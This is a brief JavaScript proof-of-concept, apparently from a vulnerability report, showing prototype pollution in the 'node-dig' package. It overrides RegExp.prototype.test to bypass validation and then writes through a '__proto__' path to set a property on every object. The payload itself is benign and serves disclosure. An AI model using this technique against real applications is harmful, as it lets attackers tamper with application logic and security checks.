RegExp.prototype.test = () => true;
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);